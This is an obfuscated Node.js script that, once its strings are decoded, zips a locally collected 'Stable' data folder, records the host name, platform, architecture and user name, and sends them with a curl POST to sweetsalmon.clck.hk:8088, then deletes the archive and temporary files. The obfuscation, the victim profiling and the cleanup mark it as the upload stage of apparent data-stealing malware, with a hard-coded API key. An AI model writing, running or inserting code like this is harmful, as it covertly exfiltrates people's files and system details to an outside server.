const _0x4f7217=_0x250b;function _0x35f4(){const _0x51df35=['0\x20Bytes','42LZrQzE','type','log','Upload\x20completed\x20successfully','Make\x20sure\x20to\x20run\x20collect-data.js\x20first','Server\x20response:\x20','2416910gxvFau','join','Failed\x20to\x20create\x20archive','message','lookup','9ttwCFQ','Failed\x20to\x20create\x20ZIP\x20archive:\x20','Upload\x20failed:\x20Server\x20returned\x20failure','30vkuVcf','185160tWVAwj','214356fTVUSy','Executing\x20curl\x20command:\x20','exit',')\x20reached,\x20giving\x20up','tmpdir','username','\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--retry\x20','785040nvKpcv','appendFileSync','toISOString','Starting\x20upload\x20process...','\x20seconds','serverPath','statSync','5165655VbbJnl','now','.zip','Retrying\x20in\x20','Starting\x20data\x20upload\x20process','serverDomain','client-id.txt','userInfo','readFileSync','path','dns','\x20-x\x20\x22*.DS_Store\x22','Domain\x20','error','arch','retryDelay','Starting\x20upload\x20to\x20','494376qOtTvw','Maximum\x20retry\x20count\x20(','Unexpected\x20error:\x20','parse','836895cFOGjJ','timeout','stableDir','ZIP\x20archive\x20created:\x20','2afgsjL','/api/files/upload','\x20seconds...\x20(Attempt\x20','Error\x20reading\x20client\x20ID:\x20','Upload\x20failed:\x20','://','Upload\x20completed\x20in\x20','hostname','\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--progress-bar','utf8','child_process','\x20of\x20','maxRetries','uploader.log','Attempting\x20to\x20resolve\x20domain:\x20','Error\x20writing\x20to\x20log:\x20','cwd','stringify','writeFileSync','toFixed','pow','system-info.json','...','serverPort','Could\x20not\x20parse\x20server\x20response\x20as\x20JSON:\x20',')\x22\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-F\x20\x22file=@','\x22\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-H\x20\x22X-Client-Info:\x20$(cat\x20','ZIP\x20file\x20removed:\x20','sweetsalmon.clck.hk','Directory\x20not\x20found:\x20','\x20resolved\x20to\x20','File\x20is\x20empty','\x22\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--connect-timeout\x2060\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--max-time\x20','size','toString','existsSync','trim'];_0x35f4=function(){return _0x51df35;};return _0x35f4();}(function(_0x4f254f,_0x2076a7){const _0x227e70=_0x250b,_0x286e77=_0x4f254f();while(!![]){try{const _0x5caae6=parseInt(_0x227e70(0xc0))/0x1*(-parseInt(_0x227e70(0x98))/0x2)+parseInt(_0x227e70(0xbc))/0x3+parseInt(_0x227e70(0x99))/0x4*(parseInt(_0x227e70(0x97))/0x5)+parseInt(_0x227e70(0xa0))/0x6+parseInt(_0x227e70(0x89))/0x7*(parseInt(_0x227e70(0xb8))/0x8)+parseInt(_0x227e70(0x94))/0x9*(-parseInt(_0x227e70(0x8f))/0xa)+-parseInt(_0x227e70(0xa7))/0xb;if(_0x5caae6===_0x2076a7)break;else _0x286e77['push'](_0x286e77['shift']());}catch(_0x1268af){_0x286e77['push'](_0x286e77['shift']());}}}(_0x35f4,0x32361));const fs=require('fs'),os=require('os'),path=require(_0x4f7217(0xb0)),{exec,execSync}=require(_0x4f7217(0xca)),dns=require(_0x4f7217(0xb1)),CONFIG={'serverDomain':_0x4f7217(0x7f),'serverPath':_0x4f7217(0xc1),'serverPort':0x1f98,'apiKey':'tJz4uRVCwl2eEwyPTudYP9iGRfgq','retryDelay':0x1388,'maxRetries':0x5,'timeout':0x927c0,'stableDir':'Stable'};function log(_0x4cd7f6,_0x3a1b11=![]){const _0x471ec2=_0x4f7217,_0x1c03a1=new Date()[_0x471ec2(0xa2)](),_0x1e684d='['+_0x1c03a1+']\x20'+_0x4cd7f6;_0x3a1b11?console[_0x471ec2(0xb4)](_0x1e684d):console[_0x471ec2(0x8b)](_0x1e684d);try{fs[_0x471ec2(0xa1)](_0x471ec2(0xcd),_0x1e684d+'\x0a');}catch(_0x56cc51){console[_0x471ec2(0xb4)](_0x471ec2(0xcf)+_0x56cc51['message']);}}function formatFileSize(_0x53fa38){const _0xdb47f9=_0x4f7217;if(_0x53fa38===0x0)return _0xdb47f9(0x88);const _0x2d2297=0x400,_0x12365b=['Bytes','KB','MB','GB','TB'],_0x19e8e5=Math['floor'](Math['log'](_0x53fa38)/Math['log'](_0x2d2297));return parseFloat((_0x53fa38/Math[_0xdb47f9(0xd4)](_0x2d2297,_0x19e8e5))[_0xdb47f9(0xd3)](0x2))+'\x20'+_0x12365b[_0x19e8e5];}function getClientId(){const _0x37b9fb=_0x4f7217;try{if(fs['existsSync'](_0x37b9fb(0xad)))return fs[_0x37b9fb(0xaf)](_0x37b9fb(0xad),'utf8')[_0x37b9fb(0x87)]();}catch(_0x5b7f4d){log(_0x37b9fb(0xc3)+_0x5b7f4d[_0x37b9fb(0x92)],!![]);}return Math['random']()[_0x37b9fb(0x85)](0x24)['substring'](0x2,0xa);}async function createZipArchive(){const _0x1d710d=_0x4f7217;try{const _0x3bcfad=getClientId(),_0x21f922=_0x3bcfad+_0x1d710d(0xa9);log('Creating\x20ZIP\x20archive:\x20'+_0x21f922+_0x1d710d(0xd6));if(!fs[_0x1d710d(0x86)](CONFIG[_0x1d710d(0xbe)]))throw new Error(_0x1d710d(0x80)+CONFIG[_0x1d710d(0xbe)]);const _0x2a56eb='zip\x20-r\x20-1\x20'+_0x21f922+'\x20'+CONFIG[_0x1d710d(0xbe)]+_0x1d710d(0xb2),_0x2b6ab0=execSync(_0x2a56eb,{'encoding':_0x1d710d(0xc9)});if(fs[_0x1d710d(0x86)](_0x21f922)){const _0x46d7b8=fs[_0x1d710d(0xa6)](_0x21f922);return log(_0x1d710d(0xbf)+_0x21f922+'\x20('+formatFileSize(_0x46d7b8[_0x1d710d(0x84)])+')'),_0x21f922;}else throw new Error('ZIP\x20archive\x20file\x20not\x20found\x20after\x20creation');}catch(_0x573a98){return log(_0x1d710d(0x95)+_0x573a98[_0x1d710d(0x92)],!![]),null;}}async function resolveDomainAndUpload(_0x365b95,_0x3934a3=0x0){const _0x325373=_0x4f7217;log(_0x325373(0xce)+CONFIG[_0x325373(0xac)]);try{const _0x19d52b=await new Promise((_0x9630a6,_0xff9612)=>{const _0x18a3ab=_0x325373;dns[_0x18a3ab(0x93)](CONFIG[_0x18a3ab(0xac)],(_0x362216,_0x262559)=>{_0x362216?_0xff9612(_0x362216):_0x9630a6(_0x262559);});});return log(_0x325373(0xb3)+CONFIG[_0x325373(0xac)]+_0x325373(0x81)+_0x19d52b),uploadFileWithCurl(_0x365b95,_0x19d52b,_0x3934a3);}catch(_0x5b954d){return log('DNS\x20resolution\x20error:\x20'+_0x5b954d[_0x325373(0x92)],!![]),_0x3934a3<CONFIG[_0x325373(0xcc)]?(log(_0x325373(0xaa)+CONFIG['retryDelay']/0x3e8+_0x325373(0xc2)+(_0x3934a3+0x1)+_0x325373(0xcb)+CONFIG[_0x325373(0xcc)]+')'),await new Promise(_0x32d2c1=>setTimeout(_0x32d2c1,CONFIG['retryDelay'])),resolveDomainAndUpload(_0x365b95,_0x3934a3+0x1)):(log('Maximum\x20retry\x20count\x20('+CONFIG[_0x325373(0xcc)]+_0x325373(0x9c),!![]),![]);}}function _0x250b(_0x47101c,_0xd5e722){const _0x35f4ad=_0x35f4();return _0x250b=function(_0x250b2,_0x45ac39){_0x250b2=_0x250b2-0x7a;let _0x3333fa=_0x35f4ad[_0x250b2];return _0x3333fa;},_0x250b(_0x47101c,_0xd5e722);}async function uploadFileWithCurl(_0x1a8389,_0xbfa6b4,_0x42b88a=0x0){const _0x21e518=_0x4f7217;try{const _0x5112e6=path[_0x21e518(0x90)](process[_0x21e518(0xd0)](),_0x1a8389);if(!fs[_0x21e518(0x86)](_0x5112e6))return log('File\x20not\x20found:\x20'+_0x5112e6,!![]),![];const _0x18c3ad=fs[_0x21e518(0xa6)](_0x5112e6),_0x5768f7=_0x18c3ad[_0x21e518(0x84)];if(_0x5768f7===0x0)return log(_0x21e518(0x82),!![]),![];const _0x47674a={'hostname':os[_0x21e518(0xc7)](),'platform':os['platform'](),'type':os[_0x21e518(0x8a)](),'arch':os[_0x21e518(0xb5)](),'username':os[_0x21e518(0xae)]()[_0x21e518(0x9e)],'id':getClientId()},_0x2fdded=path[_0x21e518(0x90)](os[_0x21e518(0x9d)](),_0x21e518(0xd5));fs[_0x21e518(0xd2)](_0x2fdded,JSON[_0x21e518(0xd1)](_0x47674a));const _0xf7e4b8=CONFIG['serverPort']===0x1bb?'https':'http';let _0x205bd6;_0xbfa6b4?_0x205bd6=_0xf7e4b8+_0x21e518(0xc5)+_0xbfa6b4+':'+CONFIG['serverPort']+CONFIG[_0x21e518(0xa5)]:_0x205bd6=_0xf7e4b8+_0x21e518(0xc5)+CONFIG[_0x21e518(0xac)]+':'+CONFIG[_0x21e518(0x7a)]+CONFIG[_0x21e518(0xa5)];log(_0x21e518(0xb7)+_0x205bd6+'\x20using\x20curl');const _0x344e51=Date[_0x21e518(0xa8)](),_0x5b6ce4='curl\x20-X\x20POST\x20\x22'+_0x205bd6+_0x21e518(0x7d)+_0x2fdded+_0x21e518(0x7c)+_0x5112e6+_0x21e518(0x83)+CONFIG[_0x21e518(0xbd)]/0x3e8+_0x21e518(0x9f)+CONFIG[_0x21e518(0xcc)]+'\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--retry-delay\x20'+CONFIG[_0x21e518(0xb6)]/0x3e8+_0x21e518(0xc8);return log(_0x21e518(0x9a)+_0x5b6ce4),new Promise((_0x511715,_0x2eac4c)=>{exec(_0x5b6ce4,(_0xdaae1e,_0xcc444,_0x5cd74e)=>{const _0x5af9ec=_0x250b;try{fs['unlinkSync'](_0x2fdded);}catch(_0x101eb3){}if(_0xdaae1e){log('Curl\x20execution\x20error:\x20'+_0xdaae1e['message'],!![]),_0x2eac4c(_0xdaae1e);return;}const _0x4e4619=(Date[_0x5af9ec(0xa8)]()-_0x344e51)/0x3e8;log(_0x5af9ec(0xc6)+_0x4e4619[_0x5af9ec(0xd3)](0x2)+_0x5af9ec(0xa4));try{const _0x31ac68=JSON[_0x5af9ec(0xbb)](_0xcc444);log(_0x5af9ec(0x8e)+JSON[_0x5af9ec(0xd1)](_0x31ac68)),_0x31ac68['success']?_0x511715(!![]):(log(_0x5af9ec(0x96),!![]),_0x2eac4c(new Error('Server\x20returned\x20failure')));}catch(_0x5de282){log(_0x5af9ec(0x7b)+_0xcc444),_0x511715(!![]);}});});}catch(_0xa21b5a){return log(_0x21e518(0xc4)+_0xa21b5a[_0x21e518(0x92)],!![]),_0x42b88a<CONFIG[_0x21e518(0xcc)]?(log(_0x21e518(0xaa)+CONFIG['retryDelay']/0x3e8+_0x21e518(0xc2)+(_0x42b88a+0x1)+_0x21e518(0xcb)+CONFIG[_0x21e518(0xcc)]+')'),await new Promise(_0x158b97=>setTimeout(_0x158b97,CONFIG[_0x21e518(0xb6)])),uploadFileWithCurl(_0x1a8389,_0xbfa6b4,_0x42b88a+0x1)):(log(_0x21e518(0xb9)+CONFIG[_0x21e518(0xcc)]+_0x21e518(0x9c),!![]),![]);}}async function main(){const _0x1d121c=_0x4f7217;try{log(_0x1d121c(0xab));!fs['existsSync'](CONFIG[_0x1d121c(0xbe)])&&(log('Data\x20directory\x20not\x20found:\x20'+CONFIG[_0x1d121c(0xbe)],!![]),log(_0x1d121c(0x8d),!![]),process[_0x1d121c(0x9b)](0x1));const _0x59380f=await createZipArchive();!_0x59380f&&(log(_0x1d121c(0x91),!![]),process['exit'](0x1));log(_0x1d121c(0xa3));const _0x565359=await resolveDomainAndUpload(_0x59380f);if(_0x565359){log(_0x1d121c(0x8c));try{fs[_0x1d121c(0x86)](_0x59380f)&&(fs['unlinkSync'](_0x59380f),log(_0x1d121c(0x7e)+_0x59380f));}catch(_0x47ed23){log('Error\x20removing\x20ZIP\x20file:\x20'+_0x47ed23['message'],!![]);}process[_0x1d121c(0x9b)](0x0);}else log('Upload\x20failed',!![]),process[_0x1d121c(0x9b)](0x1);}catch(_0x18f1a4){log(_0x1d121c(0xba)+_0x18f1a4[_0x1d121c(0x92)],!![]),process[_0x1d121c(0x9b)](0x1);}}main();
